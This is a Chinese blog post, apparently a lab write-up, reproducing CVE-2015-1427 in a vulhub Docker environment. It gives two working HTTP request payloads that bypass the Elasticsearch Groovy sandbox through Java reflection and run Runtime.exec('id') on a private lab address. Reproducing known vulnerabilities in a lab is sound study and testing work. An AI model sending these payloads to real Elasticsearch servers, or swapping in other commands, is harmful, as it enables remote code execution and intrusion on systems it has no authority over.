# CVE-2015-1427（Groovy 沙盒绕过 && 代码执行漏洞） - 浅笑996 - 博客园

> 原文：[https://www.cnblogs.com/qianxiao996/p/13574653.html](https://www.cnblogs.com/qianxiao996/p/13574653.html)

#### 1、vulhub环境搭建

[https://blog.csdn.net/qq_36374896/article/details/84102101](https://blog.csdn.net/qq_36374896/article/details/84102101)

#### 2、启动docker环境

```
cd vulhub-master/elasticsearch/CVE-2015-1427/
sudo docker-compose up 
```

![在这里插入图片描述](../Images/664673954f65de555003ae825bcb3050.png)

#### 3、访问目标的9200，会出现Elasticsearch的信息：

![在这里插入图片描述](../Images/ffc5e972187d5278b4a7eabf43bdeca3.png)
新版本中Elasticsearch将默认的脚步语言换成了Groovy，增加了沙盒机制过滤用户输入，但还是具有执行漏洞的方法：

*   绕过沙盒
*   Groovy代码执行

#### 4、利用JAVA反射机制绕过沙盒

首先向9200端口插入一条数据：

```
POST /website/blog/ HTTP/1.1
Host: 192.168.91.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
} 
```

执行结果
![在这里插入图片描述](../Images/13be60774b0e6b516d2b2f30098be7d7.png)
利用反射机制执行JAVA代码Payload：

```
POST /_search?pretty HTTP/1.1
Host: 192.168.91.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 489

{
    "size":1,
    "script_fields": {
        "test#": {  
            "script":
                "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream())).readLines()",

            "lang": "groovy"
        }
    }

} 
```

执行结果
![在这里插入图片描述](../Images/d678ffaa3938010105a437220032fbfd.png)

#### 5、利用Groovy语言执行命令

Payload:

```
POST /_search?pretty HTTP/1.1
Host: 192.168.91.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}} 
```

执行结果：
![在这里插入图片描述](../Images/88f2094a6ed4eb4cb94007051423ebfb.png)